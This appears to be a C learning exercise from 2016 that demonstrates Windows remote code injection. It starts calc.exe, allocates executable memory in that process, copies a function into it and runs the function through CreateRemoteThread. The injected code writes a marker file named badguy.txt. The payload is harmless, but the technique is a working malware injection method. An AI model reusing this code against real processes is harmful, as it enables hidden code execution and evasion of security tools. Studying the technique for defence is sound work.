#include <stdio.h>
#include <Windows.h>
#include <tchar.h>

typedef struct lol {
	TCHAR name[100];
	FARPROC yeeee;
	FARPROC wa;
	TCHAR buf[5];
};

/*Prototypes*/
void notice(FILE *des, char *buf);
void error(void);
void CodeInjection(HANDLE victim);
void offset();
DWORD WINAPI ThreadCode(lol* hahaha);

/*Entry*/
int main(int argc, char **argv)
{
	atexit(error);
	notice(stdout, "[+]BoB5 @ Jo Seokju\n");
	TCHAR yoyo_baby[] = L"C:\\Windows\\System32\\calc.exe";
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION blueberry_pie;
	si.cb = sizeof(STARTUPINFO);
	printf("%x\n", blueberry_pie.dwProcessId);
	if (!CreateProcess(yoyo_baby,
		NULL, NULL, NULL,
		FALSE, 0, NULL, NULL,
		&si, &blueberry_pie)) {
		printf("[!] CreateProcess Failed!\n");
		abort();
	}
	HANDLE iamhandle = blueberry_pie.hProcess;
	CodeInjection(iamhandle);
	exit(EXIT_SUCCESS);
}
void error(void)
{
	notice(stderr, "[+]Check Status\n");
	printf("[+]Injection SUCCESS\n");
}

void CodeInjection(HANDLE victim)
{
	HANDLE foo;
	LPVOID va;
	HANDLE yo;
	lol hahaha;

	HMODULE hello = LoadLibrary(_T("kernel32.dll"));
	HMODULE there = LoadLibrary(_T("kernel32.dll"));

	LPVOID string, func;
	TCHAR boo[] = _T("C:\\Users\\Pillar\\Desktop\\badguy.txt");

	FARPROC yeeee = GetProcAddress(hello , "CreateFileW");
	hahaha.yeeee = yeeee;
	wcscpy(hahaha.name, boo);

	FARPROC wtf = GetProcAddress(there, "WriteFile");
	hahaha.wa = wtf;
	wcscpy(hahaha.buf, _T("D34D"));

	DWORD id = GetProcessId(victim);
	DWORD size = (BYTE *)offset - (BYTE *)ThreadCode;
	foo = OpenProcess(MAXIMUM_ALLOWED, FALSE, id);
	
	func = VirtualAllocEx(foo, NULL, sizeof(lol), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(foo, func, (LPCVOID)&hahaha, sizeof(lol), NULL);
	
	va = VirtualAllocEx(foo, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(foo, va, (LPCVOID)ThreadCode, size, NULL);

	yo = CreateRemoteThread(foo, NULL, 0, (LPTHREAD_START_ROUTINE)va, func, CREATE_SUSPENDED, NULL);
	ResumeThread(yo);
	WaitForSingleObject(yo, INFINITE);

	/*close*/
	CloseHandle(foo);
	CloseHandle(yo);
}
DWORD WINAPI ThreadCode(lol* hahaha)
{
	DWORD result;
	HANDLE helper;

	HANDLE(__stdcall *proc)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
	proc = (HANDLE(__stdcall*) (LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))hahaha->yeeee;
	
	helper = proc((LPCWSTR)hahaha->name, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		0, NULL);
	
	BOOL(__stdcall *func)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
	func = (BOOL(__stdcall*) (HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))hahaha->wa;

	func(helper, hahaha->buf, sizeof(TCHAR) * 4, &result, NULL);
	return 0;
}
void offset()
{

}
void notice(FILE *des, char *buf)
{
	fprintf(des, " * * * C0D3 1nj3cti0n * * *\n%s", buf);

	/*
	*		CODE Injection
	*
	*		BoB5 @ Jo Seok ju
	*		2016.08.02
	*/
}
